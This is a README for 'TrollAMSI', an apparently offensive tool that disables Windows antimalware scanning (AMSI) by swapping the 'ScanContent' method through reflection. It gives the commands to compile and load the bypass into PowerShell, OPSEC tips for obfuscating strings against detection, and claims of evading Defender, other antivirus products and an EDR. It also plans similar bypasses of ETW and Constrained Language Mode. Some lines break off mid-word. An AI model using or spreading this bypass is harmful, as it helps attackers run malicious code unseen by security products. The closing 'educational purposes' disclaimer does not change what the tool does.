# TrollAMSI
Uses reflection to get handle to "ScanContent" method. Swaps the handle with   

This new technique is called "Reflection with method swapping". Opens doors for other techniques such as ETW and CLM.

# Benefits
- No P/Invoke or win32 API calls or calls to virtualprotect, etc
- No amsi.dll patching
- 
# Usage 

## IEX 
```
>c:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /t:library /out:TrollAMSI.dll WorkingAMSIbypass.cs /reference:c:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
>[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes("C:\TrollAMSI.dll"))
>[Tro
```
## Compiled
```
>c:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /t:library /out:TrollAMSI.dll TrollAMSI.cs /reference:c:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
>[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes("C:\TrollAMSI.dll"))
>[TrollAMSI]::troll()
```

# OPSEC
- STATIC: obfuscate "AmsiUtils" and "ScanContent" maybe?
- DYNAMIC: Nothing much really. Note that IEX method will temporarily write to disk.

# TESTING
- Tested on win defender, 2 AV and 1 EDR 
- Eitherway security products monitor amsi.dll and the relevant winapi calls which we do not touch
  
# Wishlist
- same technique should/could be applicable to bypass
  - ETW write
  - CLM enforcement
  - maybe there's more?
  
# Disclaimer
Should only be used for educational purposes!
